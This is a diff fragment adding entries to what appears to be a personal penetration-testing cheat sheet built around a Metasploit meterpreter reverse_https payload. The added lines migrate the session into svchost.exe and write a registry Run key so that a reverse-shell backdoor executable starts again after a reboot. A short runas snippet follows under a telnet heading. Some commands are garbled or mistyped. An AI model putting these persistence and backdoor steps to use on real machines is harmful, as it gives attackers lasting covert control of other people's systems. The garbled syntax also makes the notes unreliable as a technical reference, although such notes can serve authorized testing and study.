@@ -946,3 +946,15 @@ set handlersscert ctrl c path to .pem
 set stagerverifysslcert true
 set payload windows/x64.meterpreter/reverse_https
 ```
+##### Migrate
+```bash
+set AutoRunScript post/windows/manage/migrate
+svchost.exe
+RUN THE BACKDOOR AFTER RESET
+meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d '"C:\inetpub\ftproot\msf_reverse.exe"' -v msf_reverse
+```
+##### TELNET
+```bash
+To get things to run correctly:
+runas /user:netadmin (or whatever user) 
+```
